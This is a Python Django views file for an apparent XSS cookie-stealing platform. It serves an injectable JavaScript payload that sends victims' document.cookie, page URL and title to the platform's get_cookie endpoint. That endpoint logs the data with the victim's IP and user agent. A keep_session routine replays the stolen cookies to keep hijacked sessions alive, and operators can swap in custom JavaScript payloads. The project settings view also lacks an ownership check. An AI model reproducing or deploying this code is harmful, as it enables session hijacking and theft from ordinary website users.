#coding=utf-8
import time
import json
import urllib2
import random
import hashlib
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, Http404, HttpResponseRedirect, HttpResponseForbidden
from django.shortcuts import render, redirect, render_to_response
from xsser.settings import BASE_URL
from .models import XssProject, Record


@login_required(login_url="/login/")
def create_project(request):
    if request.method == "GET":
        return render(request, "core/create_project.html")
    else:
        title = request.POST.get("title")
        if not title:
            return HttpResponse("Please input title")
        if len(title) > 25:
            title = title[:25]
        project_id = hashlib.md5(unicode(random.uniform(1, 10) + time.time())).hexdigest()[:15]
        p = XssProject.objects.create(project_id=project_id, user=request.user, title=title)
        return HttpResponseRedirect("/project?id=%s" % p.project_id)


@login_required(login_url="/login/")
def project_detail(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(project_id=project_id, user=request.user)
    except XssProject.DoesNotExist:
        raise Http404
    if "csrftoken" in request.COOKIES:
        token = request.COOKIES["csrftoken"]
    else:
        token = ""
    return render(request, "core/project_detail.html", {"project": p, "base_url": BASE_URL, "token": token})


#TODO:获取ip等信息可能存在绕过
def get_cookie(request):
    project_id = request.GET.get("id", "-1")
    title = request.GET.get("title")
    url = request.GET.get("url")
    cookie = request.GET.get("cookie")
    if "HTTP_X_FORWARDED_FOR" in request.META:
        ip = request.META['HTTP_X_FORWARDED_FOR']
    else:
        ip = request.META['REMOTE_ADDR']
    user_agent=request.META.get("HTTP_USER_AGENT")
    try:
        p = XssProject.objects.get(project_id=project_id)
    except XssProject.DoesNotExist:
        raise Http404
    r = Record.objects.create(cookie=cookie, user_agent=user_agent, ip=ip, url=url, title=title)

    p.records.add(r)
    p.save()
    return HttpResponse("success")


def xss_js(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(project_id=project_id)
    except XssProject.DoesNotExist:
        raise Http404
    js = """
    var x=new Image();
    x.src=''+'%s'+'?id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
    """ % (BASE_URL + "get_cookie/", p.project_id)
    if p.custom_js:
        js = p.custom_js_content
    return HttpResponse(js)


@login_required(login_url="/login/")
def my_projects(request):
    p = XssProject.objects.filter(user=request.user)
    return render(request, "core/my_project.html", {"projects": p})


@login_required(login_url="/login")
def delete_project(request):
    project_id = request.GET.get("id", "-1")
    token = request.GET.get("token", " ")

    if "csrftoken" in request.COOKIES:
        if token == request.COOKIES["csrftoken"]:
            try:
                p = XssProject.objects.get(user=request.user, project_id=project_id)
                p.delete()
                return HttpResponse("success")
            except XssProject.DoesNotExist:
                raise Http404
    return HttpResponseForbidden("Invalid Token")


@login_required(login_url="/login/")
def project_settings(request, project_id):
    if request.method == "GET":
        try:
            p = XssProject.objects.get(project_id=project_id)
        except XssProject.DoesNotExist:
            raise Http404
        return render(request, "core/project_settings.html", {"project": p})
    else:
        try:
            p = XssProject.objects.get(project_id=project_id)
        except XssProject.DoesNotExist:
            raise Http404
        checkbox_list = request.POST.getlist("settings")
        if "custom_js" in checkbox_list:
            p.custom_js = True
            p.custom_js_content = request.POST.get("custom_js_content")
            print p.custom_js_content
        else:
            p.custom_js = False
        if "keep_session" in checkbox_list:
            p.keep_session = True
        else:
            p.keep_session = False

        p.save()
        return HttpResponseRedirect("/project/settings/%s/" % p.project_id)


def func_test(request):
    response = render_to_response("core/func_test.html", {})
    response.set_cookie("test_cookie", "this is a test cookie")
    return response


def keep_session(request):
    p = XssProject.objects.filter(keep_session=True)
    for item in p:
        for record in item.records.all():
            try:
                req = urllib2.Request(record.url)
                req.add_header("cookie", record.cookie)
                response = urllib2.urlopen(req)
                #print response.read()
            except urllib2.URLError:
                pass

    return HttpResponse("success")




